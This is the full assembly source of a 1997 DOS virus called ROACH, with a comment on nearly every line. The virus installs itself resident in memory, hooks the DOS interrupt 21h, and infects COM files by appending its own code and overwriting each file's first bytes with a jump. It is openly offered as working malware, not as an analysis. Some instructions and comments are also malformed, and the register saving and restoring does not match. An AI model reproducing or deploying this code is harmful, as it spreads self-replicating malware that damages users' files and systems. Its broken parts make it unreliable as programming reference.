;Developed and Programmed in Australia.
;Copy_ya_right 1997

;Virus Name : ROACH

;The ROACH virus will install itself memory resident, below the video memory.
;once this virus is in memory it will only infect COM files.  It will not
;infect command.com.

;--------------------------- S T A R T -------------------------------------

host_start:                                     ;start of the host file
        jmp virus_start                         ;start the virus code
        mov ah,4ch                              ;exit the virus code
        int 21h                                 ;dos call

;----- This is the start of the virus code ----------------------------------

virus_start:                                    ;start of the virus code
        mov ax,sp                               ;load ax with stack pointer
        mov si,ax                               ;move stack pointer to si
        mov ax,ss                               ;move stack segment to ax
        mov ds,ax                               ;load ds with stack segment
        mov di,100h                             ;point to the host start
        mov cx,2                                ;we need to do this twice
push_100_to_stack:
        dec si,2                                ;dec the stack pointer
        mov sp,si                               ;move the stack pointer
        mov word ptr ds:[si],di                 ;save di to the stack
        loop push_100_to_stack                  ;do it twice

        inc di                                  ;inc byte one
        mov al,byte ptr es:[di]
        mov ah,byte ptr es:[di+1]
        add ax,103h
        mov bp,ax                               ;save to the

        add si,2                                ;inc the stack pointer
        mov sp,si                               ;mov the stack pointer
        mov di,word ptr ds:[si]                 ;get the address from stack

        mov si,bp                               ;load si with fix address
        add si,virus_len                        ;and host to the source index
        sub si,3
        push es
        pop ds                                  ;get the data segment
        mov cx,3                                ;move 3 bytes
        rep movsb                               ;and move the data back

        mov ax,5432h                            ;are we resident
        int 21h                                 ;dos call
        cmp ax,0063h                            ;are we resident
        jne memory_resident                     ;lets go resident

exit_virus:
        xor ax,ax                               ;fix up
        mov bx,ax                               ;fix up
        mov cx,ax                               ;fix up
        mov dx,ax                               ;fix up
        mov di,ax                               ;fix up
        mov si,ax                               ;fix up
        mov es,ax                               ;fix up
        ret                                     ;and return to the host

;----- This makes the virus go memory resident ------------------------------

memory_resident:
        mov ah,52h                              ;get the list of lists
        int 21h                                 ;dos call
        mov ax,es:[bx-2]                        ;load ax first mcb chain
        mov es,ax                               ;set es to first mcb block

mcb1:
        cmp byte ptr es:[0],'Z'                 ;is it the last mcb chain
        jne mcb2                                ;not then next mcb chain
        clc                                     ;clear carry flag
        jmp mcbx                                ;found last mcb chain, bail

mcb2:
        mov ax,es                               ;mov extra segment to ax
        add ax,word ptr es:[3]                  ;add from the list
        inc ax                                  ;fix up
        mov es,ax                               ;es is the new segment
        jmp short mcb1                          ;and do it again

mcbx:
        mov byte ptr es:[0],'Z'                 ;make it the last mcb chain
        sub word ptr es:[3],virus_len/15        ;take the virus from the mcb
        add ax,word ptr es:[3]                  ;
        inc ax                                  ;fix up the address
        mov es,ax                               ;es is the new segment

        push es                                 ;save to the stack
        push cs                                 ;push the code segment
        pop ds                                  ;get ds from the stack

        mov ax,3521h                            ;get interrupt 21h
        int 21h                                 ;dos call
        mov si,bp                               ;load the si with virus start
        add si,virus_len                        ;add the virus len to it
        sub si,7
        mov word ptr ds:[si],bx                 ;save the old int 21h vector
        mov word ptr ds:[si+2],es               ;save the old int 21h vector

        pop ds                                  ;get from the stack
        mov ax,2521h                            ;get the interrupt vector
        mov dx,new_21

        int 21h                                 ;dos call
        push ds
        pop es
        push cs
        pop ds
        xor di,di
        mov si,bp                               ;offset of the start of virus
        mov cx,virus_len                        ;number of bytes to move

do_load_tsr:
        mov ax,word ptr ds:[si]                 ;load the byte from host
        mov word ptr es:[di],ax                 ;store the byte in memory
        add si,2                                ;inc the host pointer
        add di,2                                ;inc the memory pointer
        loop do_load_tsr

        push cs                                 ;push the code segment
        pop ds                                  ;reset ds to the original
        jmp exit_virus                          ;exit the virus code

        db '[Roach] by SliceMaster 1997'        ;copyright string roach

;----- This is the code that runs in memory ---------------------------------

exit_virus_tsr:
        jmp dword ptr cs:[data_start]           ;exit back to the function

fake_dos_function:
        pushf                                   ;save the flags
        call dword ptr cs:[data_start]          ;fake a dos call
        ret                                     ;and return

new_21h:
        cmp ax,5432h                            ;is it the virus checking
        jne check_interrupts                    ;check out the interrupts
        mov ax,0063h                            ;yep we are in memory
        iret                                    ;interrupt return

check_interrupts:
        inc ah                                  ;add one the the function
        cmp ah,4ch                              ;load and exec a program
        je go_virus_infect                      ;this is our interrupt
        cmp ah,3eh                              ;open file call
        je go_virus_infect                      ;this is our interrupt
        cmp ah,44h                              ;change attrubute call
        je go_virus_infect                      ;this is our interrupt
        dec ah                                  ;sub one from the function
        jmp exit_virus_tsr                      ;exit the virus in memory

go_virus_infect:
        dec ah                                  ;fix up before we exit
        push ax                                 ;\
        push bx                                 ; \
        push cx                                 ;  \
        push dx                                 ;   \
        push si                                 ;    / save to the stack
        push di                                 ;   /    so the interrupt
        push ds                                 ;  /       will work on
        push es                                 ; /             exit.
        push bp                                 ;/

        call check_ext                          ;is it a com file
        call open_host                          ;open the host file for r/w
        call read_host_3                        ;read the host first 3
        call infect_host                        ;infect file

exit_host_infected:
        call close_host                         ;close the host file

exit_virus_memory:                              ;ti                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    we are here.
        pop ax                                  ;/
        jmp exit_virus_tsr                      ;exit the virus tsr

;----- This checks the file ext --------------------------------------------

check_ext:
        push dx
        pop si                                  ;get the source index
        mov cx,0ffh                             ;search for a com file ext
find_ext:
        mov al,byte ptr ds:[si]                 ;load the byte at ds:dx
        cmp al,'.'                              ;is it a .
        je found_ext                            ;found the ext
        inc si                                  ;inc the location
        loop find_ext                           ;do it again

found_ext:
        inc si                                  ;inc the position
        mov ax,word ptr ds:[si]                 ;load the byte ad ds:si
        cmp ax,'OC'                             ;is it a com file
        je found_com_file                       ;do a nother check
        pop ax                                  ;get off the stack
        jmp exit_virus_memory                   ;not com file bail

found_com_file:
        ret                                     ;and return

;----- This opens a host file -----------------------------------------------

open_host:
        mov ax,3d02h                            ;open file read write access
        call fake_dos_function                  ;fake a dos interrupt
        mov bx,ax                               ;move the handle into bx
        ret                                     ;and return

;----- This closes a host file ----------------------------------------------

close_host:
        mov ah,3eh                              ;close a file
        call fake_dos_function                  ;close the file
        ret                                     ;and return

;----- This reads the first 3 bytes from the host ---------------------------

read_host_3:
        push ds                                 ;save to the stack
        push dx                                 ;save to the stack
        push cs                                 ;push the code segment
        pop ds                                  ;get the tsr segment
        xor dx,dx                               ;zero out dx
        add dx,virus_len                        ;add the virus len to it
        sub dx,3                                ;fix up dx to point to buffer
        push dx                                 ;save to the stack
        mov ah,3fh                              ;read from the host
        mov cx,3                                ;read 3 bytes of host
        call fake_dos_function                  ;fake a dos call

        pop si                                  ;get si from the stack
        mov ah,byte ptr ds:[si]                 ;load ah with the first byte
        cmp ah,0e9h                             ;is it a jump instruction
        je is_infect                            ;is the file infected
        cmp ah,'M'                              ;does it have a MZ header
        je is_infect                            ;the file is a command.com
        pop dx                                  ;get call from the stack
        pop ds                                  ;get call from the stack
        ret                                     ;and return

is_infect:
        pop dx                                  ;get from the stack
        pop ds                                  ;get call from the stack
        pop ax                                  ;get call from the stack
        jmp exit_host_infected                  ;exit the host is infected

;----- This infects the host file -------------------------------------------

infect_host:
        push ds                                 ;save to the stack
        push dx                                 ;save to the stack
        call lseek_end                          ;seek to the end of the host
        push ax                                 ;save the location
        push cs                                 ;push the code segment
        pop ds                                  ;get the virus segment

        mov ah,40h                              ;time to write virus to end
        mov cx,virus_len                        ;number of bytes to write
        xor dx,dx                               ;at the start of the segment
        call fake_dos_function                  ;fake a dos function
        call lseek_start                        ;seek to the start

        xor dx,dx                               ;zero out dx
        add dx,virus_len                        ;add the virus len to it
        sub dx,3                                ;fix up dx to point to buffer
        mov si,dx                               ;mov si the pointer

        mov ah,0e9h                             ;mov jump instruction in ah
        mov byte ptr ds:[si],ah                 ;write the jump in
        pop ax                                  ;get off the stack
        dec al,3
        mov word ptr ds:[si+1],ax               ;write the address to buffer

        mov dx,si                               ;write to dx the pointer
        mov cx,3                                ;number of bytes to write
        mov ah,40h                              ;write to the host file
        call fake_dos_function                  ;fake a dos function call

        pop dx                                  ;get off the stack
        pop ds                                  ;get off the stack
        ret                                     ;and return

;----- This seeks to the start or end of the host ---------------------------

lseek_end:
        mov ax,4202h                            ;seek to the end
        jmp lseek                               ;and do the seeking
lseek_start:
        mov ax,4200h                            ;seek to the start
lseek:
        xor dx,dx                               ;to start/end of host
        xor cx,cx                               ;to start/end of host
        call fake_dos_function                  ;fake a dos call
        ret                                     ;and return

;----- From here down is were all the data for virus is stored!! ------------

data1:

old_21h         dd 0                            ;old interrupt 21h function
host_3          db 3 dup(90h)                   ;original first 3 bytes

virus_end:
virus_len equ virus_end - virus_start           ;len of the virus code
data_start equ data1 - virus_start              ;starting address of data
new_21 equ new_21h - virus_start                ;len from the start to int
